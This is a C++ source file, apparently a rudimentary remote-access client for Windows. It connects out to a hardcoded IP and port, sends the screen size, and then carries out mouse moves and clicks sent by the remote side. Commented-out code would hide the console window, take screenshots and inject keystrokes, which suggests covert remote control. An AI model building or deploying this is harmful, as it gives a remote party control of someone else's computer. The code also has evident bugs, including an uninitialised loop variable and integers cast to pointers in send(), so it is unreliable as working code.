#include <ctime>
#include <cstdlib>
#include <string>
#include <Windows.h>
#include <winable.h>
#include <Wingdi.h>
#include <gdiplus.h>
#include <conio.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <pthread.h>
#include <winsock2.h>

using namespace std;

void* recvFunc(void*);

HWND GetConsoleHwnd(void)
{
       #define MY_BUFSIZE 1024 // Buffer size for console window titles.
       HWND hwndFound;         // This is what is returned to the caller.
       char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated
                                           // WindowTitle.
       char pszOldWindowTitle[MY_BUFSIZE]; // Contains original
                                           // WindowTitle.
       // Fetch current window title.
       GetConsoleTitle(pszOldWindowTitle, MY_BUFSIZE);
       // Format a "unique" NewWindowTit
       wsprintf(pszNewWindowTitle,"%d/%d", GetTickCount(), GetCurrentProcessId());
       // Change current window title.
       SetConsoleTitle(pszNewWindowTitle);
       // Ensure window title has been updated.
       Sleep(40);
       // Look for NewWindowTitle.
       hwndFound=FindWindow(NULL, pszNewWindowTitle);
       // Restore original window title.
       SetConsoleTitle(pszOldWindowTitle);
       return(hwndFound);
}
// char* takeScreenshot(int x, int y)
// {
//     void *lpBits;
//     HDC hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);
//     HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
//     HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, x, y);
//     HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
//     BitBlt(hMemoryDC, 0, 0, x, y, hScreenDC, 0 , 0, SRCCOPY);
//     hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);

//     DeleteDC(hMemoryDC);
//     DeleteDC(hScreenDC);

//     int padding = 0;
//     BITMAPINFO bmi;
//     bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
//     bmi.bmiHeader.biWidth = x;
//     bmi.bmiHeader.biHeight = y;
//     bmi.bmiHeader.biPlanes = 1; 
//     bmi.bmiHeader.biBitCount = 24; 
//     bmi.bmiHeader.biCompression = 0; 
//     bmi.bmiHeader.biSizeImage = x * (y * 3 + padding); 
//     bmi.bmiHeader.biXPelsPerMeter = 0; 
//     bmi.bmiHeader.biYPelsPerMeter = 0; 
//     bmi.bmiHeader.biClrUsed = 0; 
//     bmi.bmiHeader.biClrImportant = 0; 

//     GetDIBits(hMemoryDC, hBitmap, 0, y, lpBits, &bmi, DIB_RGB_COLORS);
//     return (char*)lpBits; 
// } 

int main()
{
    WSADATA wsaData;
    SOCKET s1;
    pthread_t t1;
    struct sockaddr_in hax;
    cout << "work" << endl;
    HWND HWin = GetConsoleHwnd();
    // ShowWindow(HWin, SW_HIDE);
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    hax.sin_family = AF_INET;
    hax.sin_port = htons(6545);
    hax.sin_addr.s_addr = inet_addr("192.168.0.16");
    int test;
    while (test != 0)
    {
        test = WSAConnect(s1, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    }
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN); 
    send(s1, (char*)x, sizeof(x), 0);
    send(s1, (char*)y, sizeof(y), 0);
    pthread_create(&t1, NULL, recvFunc, (void*)&s1);
    pthread_join(t1, NULL);
    pthread_cancel(t1);
    closesocket(s1);
    return 0;
}

void* recvFunc(void* Psock)
{
    SOCKET sock = *(SOCKET*)Psock;
    struct tagBlockSend
    {
        int x;
        int y;
        int key;
        bool rightClick;
        bool leftClick;
        bool shutdown;
    };
    tagBlockSend blockSend;

    while(1)
    {
        recv(sock, (char*)&blockSend, sizeof(blockSend), 0);
        SetCursorPos(blockSend.x, blockSend.y);

        // if (blockSend.key != 0)
        // {
        //         PINPUT strKeyboard;
        //         KEYBDINPUT strKin;
        //         strKin.wVk = blockSend.key;
        //         strKin.wScan = 0;
        //         strKin.dwFlags = KEYEVENTF_KEYUP;
        //         strKin.time = 0;
        //         strKin.dwExtraInfo = 0;
        //         strKeyboard->type = INPUT_KEYBOARD;
        //         strKeyboard->ki = strKin;
        //         SendInput(1, strKeyboard, sizeof(strKeyboard));
        // }
        if (blockSend.rightClick == true)
        {
            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
            cout << "Right Click" << endl;
        } 
        if (blockSend.leftClick == true)
        {
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
            cout << "Left Click" << endl;
        }
    }
}